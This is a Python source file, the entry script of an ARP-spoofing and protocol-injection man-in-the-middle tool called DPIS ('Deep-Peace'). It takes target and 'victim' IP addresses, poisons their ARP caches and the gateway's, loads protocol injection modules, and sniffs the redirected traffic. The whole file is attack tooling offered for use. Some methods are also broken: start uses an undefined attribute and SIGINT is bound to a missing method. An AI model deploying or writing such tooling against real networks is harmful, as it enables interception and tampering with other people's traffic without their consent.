#! .venv/bin/python
import importlib
import argparse
import importlib.util
import platform
import signal
import sys
import os
import re
import time
import scapy.all as scapy
from lib import logger as liblog, sniffer as sniff
from lib.spoofing import Spoofer

# Regex for checking mac address
r_mac = re.compile('^(([0-9a-f]{2})(:(?!$)|$)){6}$', re.IGNORECASE)
# Regex for checking ip address
r_iadr = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
# Regex for checking port
r_port = re.compile('^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$')

targets = 0
log	 = None

class Target:
	name		= ""
	ip		  = ""
	mac		 = ""
	valid	   = False
	def get_mac(self, ip) -> bool:
		global r_mac
		# ARP request
		req = scapy.ARP(pdst=ip)
		# Broadcast Ethernet layer
		brd = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		# Build the packet
		arp_req = brd / req
		# Wait for the response (2 seconds)
		res = scapy.srp(arp_req, timeout=2, verbose=False)[0]
		# getting the MAC
		#self.mac = res[0].hwsrc
		if len(res) == 0:
			log.error("host with ip {} seems to not be online.".format(ip))
		elif r_mac.match(res[0][1].hwsrc):
			self.valid = True
			self.mac = res[0][1].hwsrc
		return self.valid

	def __init__(self, ip, name):
		global r_iadr, r_mac, targets
		if len(name) == 0:
			name = "target"+str(targets)
		log.debug("new target {} with ip: {}".format(name, ip))
		if r_iadr.match(ip):
			self.name   = name
			self.ip	 = ip
			targets	 = targets + 1
			if not self.get_mac(self.ip):
				log.error("failed to get mac address for {}".format(name))
			else:
				log.print("new target defined with name {} and ip {}".format(name, ip))
		else: log.print("bad ip address for target {} got: {}".format(name, ip))

# Dynamic Protocol Injector Sniffer (called Deep-Peace)
class DPIS:
	# define our instance variables
#   logger	  = None
	sniffer	 = None
	spoofer	 = None
	firewall	= None
	protocol	= []

	# host interface we're listening to
	iface	   = ""
	# host informations [ip, mac]
	host		= ["", ""]
	# protocol informations [[name, port]
	protoinfo   = []
	# gateway informations Target(gateway)
	gateway	 = None
	# targets List[Target(), ...]
	targets	 = []
	# victims List[Target(), ...]
	victims	 = []
	# toggle stdin for incoming datas
	stdin	   = False
	# enable socket to intercept datas
	socket	  = None
	def __init__(self, iface, proto, target, victim, spoof = False, firewall = False):
		global r_port, log;
		self.iface	  = iface
		self.host	   = [scapy.get_if_addr(iface), scapy.get_if_hwaddr(iface)]
		log.print("current host informations:\n\tinterface:\t{}\n\tip:\t\t{}\n\tmac:\t\t{}".format(iface, self.host[0], self.host[1]))
		# we detect the gateway for the current interface
		for route in scapy.conf.route.routes:
			if iface in route and route[4] == '0.0.0.0':
				self.gateway	= Target(route[2], 'gateway')
				break;
			else:
				self.gateway	= scapy.conf.route.route('0.0.0.0')[2]
				break;
		# creation of every Target object class
		for t in target:
			if isinstance(t, list):
				self.targets.append(Target(t[0], "" if t[1] is None or len(t[1]) == 0 else t[1]))
			else: self.targets.append(Target(t, ""))
		for v in victim:
			if isinstance(v, list):
				self.victims.append(Target(v[0], "" if v[1] is None or len(v[1]) == 0 else v[1]))
			else: self.victims.append(Target(v, ""))
		try:
			# If multiple protocol was specified, load and initialize every protocol
			if not isinstance(proto[0], list):
				proto = [proto]
			for p in proto:
				# Split the port argument into protocol_name and port
				p = p.split(':')
				# Make sure port format is correct
				if not r_port.match(p[1]):
					log.error("Invalid target port!")
					sys.exit(2)
				self.protoinfo.append(p);
				self.protocol.append(importlib.import_module("lib.proto."+p[0]).Protocol(
					self.host, self.victims, self.targets, self.gateway, self.stdin
				))
		except (Exception or RecursionError or ReferenceError) as E:
			log.debug(E)
			sys.exit(2)
		log.debug("protocol {} selected on port {}".format(self.protoinfo[0][0], self.protoinfo[0][1]))
		if firewall:
			self.firewall = firewall
		if spoof:
			self.spoofer = Spoofer(self.host, 1)
			for victim in self.victims:
				self.spoofer.spoof(victim, self.gateway)
				for target in self.targets:
					self.spoofer.spoof(victim, target)
			for target in self.targets:
				self.spoofer.spoof(target, self.gateway)
				for victim in self.victims:
					self.spoofer.spoof(target, victim)
		log.debug(self.protocol)
		self.sniffer = sniff.sniffer(
			self.victims[0],
			self.targets[0],
			self.iface,
			self.protoinfo[0][1],
			self.protocol[0]
		)

	# Start instances and threads.
	def start(self) -> bool:
		global log
		self.protocol.start()
		if self.firewall is not None:
			log.print("Enabling firewall rules...")
		if self.spoofer is not None:
			log.print("Starting spoofer, please wait for a while...")
			self.spoofer.start()
		log.print("Sniffing on port {}".format(self.proto[1]))
		self.sniffer.start()

	# Stop threads and exit program.
	def stop(self, *_) -> None:
		global log
		log.print("Killing threads and exiting...")
		self.sniffer.stop()
		if self.spoofer is not None:
			self.spoofer.stop()
		if self.protocol is not None:
			self.protocol.stop()
		sys.exit(0)

	# Execute readline for specified protocol.
	def stdin(self) -> None:
		True

# Main function, parses every arguments and return dyn class
def main() -> DPIS:
	# import global settings(get all Var)
	global log, r_iadr
	print("""
\x1b[1;92m      :::::::::  ::::::::: ::::::::::: :::::::: 
\x1b[0;92m     :+:    :+: :+:    :+:    :+:    :+:    :+: 
\x1b[0;32m    +:+    +:+ +:+    +:+    +:+    +:+         
\x1b[0;33m   +#+    +:+ +#++:++#+     +#+    +#++:++#++   
\x1b[0;33m  +#+    +#+ +#+           +#+           +#+ \x1b[0mby \x1b[0;31mN0x4z3r\x1b[0m, \x1b[0;36mRmalet
\x1b[0;93m #+#    #+# #+#           #+#    #+#    #+# \x1b[31mm\x1b[0;93mi\x1b[0;33mt\x1b[0;92mm
\x1b[1;93m#########  ###       ########### ########\x1b[0m

	Dynamic Protocols Injection and Spoofing
	(called Deep-Peace)""")
	#if platform.system() == "Windows":
	#	try:
	#		import pyuac
	#	#	if not pyuac.isUserAdmin():
	#	#		print("\x1b[0;31;40mThis program should be run as Administrator.\x1b[0m")
	#	#		#rc = pyuac.runAsAdmin()
	#	#		exit(1)
	#	except Exception as E:
	#		if type(E.args[0]) == str and "No module" in E.args[0]:
	#			module = E.args[0].split(' ')
	#			if "win32con" in module:
	#				module = "'pypiwin32'"
	#			print("\x1b[0;31;40mShould install {} on windows platform.\x1b[0m".format(module[len(module) - 1]))
	#		else:
	#			print(E)
	#		exit(1)
	# Make sure the script is being run as root
	if platform.system() != "Windows" and os.geteuid() != 0:
		print("\x1b[0;31;40mThis program should be run as root.\x1b[0m")
		exit(1)

	# Parser to handle command-line arguments
	parser = argparse.ArgumentParser()

	#Optionnal firewall settings
	firewall = parser.add_mutually_exclusive_group(required=False)
	firewall.add_argument("-f", "--firewall",
						help="Create multiple firewall rules",
						dest="firewall",
						action='store_true')
	spoofing = parser.add_mutually_exclusive_group(required=False)
	spoofing.add_argument("-S", "--no-spoofing",
						help="Disable ARP spoofing",
						dest="spoofing",
						action='store_false')
	# optionnal: control the verbosity of the program 0 = Silent 3 = most verbose
	parser.add_argument("-v", "--verbose",
						help="Display more informations",
						choices=[0, 1, 2, 3],
						required=False,
						default=0,
						type=int)
	# Set the defaults values for optional arguments
	parser.set_defaults(firewall=False, spoofing=True)

	#Optional : Arg to write in a .pcap file
	#parser.add_argument("-w", "--write", help="create a pcap file.", required=False, default=False)
	# Optional : Arg to execute a terminal protocl via standard input 
	parser.add_argument("-s", "--stdin",
						help="try to execute a terminal protocol.",
						required=False,
						default=False,
						action='store_true')
	#Argument for the network interface listener
	parser.add_argument("iface", help="Set interface listening to")
	#Arguement for the port destination
	parser.add_argument("protocol", help="Define the protocol and port <name>:<port>")
	#Argument for the ip source
	parser.add_argument("target", help="List of targets ip address (most of cases server ip address)\n\t\t<target>[,<target>[,...]]")
	#Argument for the ip source
	parser.add_argument("victim", help="List of victims ip address\n\t\t<victim>[,<victim>[,...]]")

	# parse command-line argument
	args = parser.parse_args()
	# Create our logger instance
	log = liblog.Logger(args.verbose)

	if len(args.iface) == 0:
		log.error("Bad argument <iface> got empty value.")
		exit(1)
	else:
		ifaces = scapy.get_working_ifaces()
		if not args.iface in ifaces:
			log.error("Interface {} doesn't exist or isn't working. printing valid interfaces:\n\t{}".format(args.iface, ifaces))
			exit(1)

	if not ":" in args.protocol:
		log.error("Bad argument for <protocol> should specify <name>:<port>[, <name>:<port>]")
		exit(1)

	if len(args.target) == 0:
		log.error("Bad argument for <target>")
		exit(1)
	elif ',' in args.target:
		args.target = args.target.split(',');
	else:
		args.target = [args.target]
	i = 0
	for t in args.target:
		if not r_iadr.match(t):
			log.error("Bad <target> number {} got {}".format(str(i), t))
			exit(1)
		i = i + 1

	if len(args.victim) == 0:
		log.error("Bad argument for <victim>")
		exit(1)
	elif "," in args.victim:
		args.victim = args.victim.split(",")
	else:
		args.victim = [args.victim]
	i = 0
	for v in args.victim:
		if not r_iadr.match(v):
			log.error("Bad <victim> number {} got {}".format(str(i), v))
			exit(1)
		i = i + 1

	return DPIS(
		args.iface,
		args.protocol,
		args.target,
		args.victim,
		args.spoofing,
		args.firewall
	);
	# While the programe is running, accepting stdin process incoming data
	while args.stdin:
		payload = sys.stdin.readline()
		ready = lpkt.psh(payload)
		lpkt.send(ready)

if __name__ == "__main__":
	if platform.system() == "Windows":
		time.sleep(4)
	# Call the main fonction
	program = main()
	# Catch interrupt signal and run exit functions
	signal.signal(signal.SIGINT, program.exit)
	program.start()
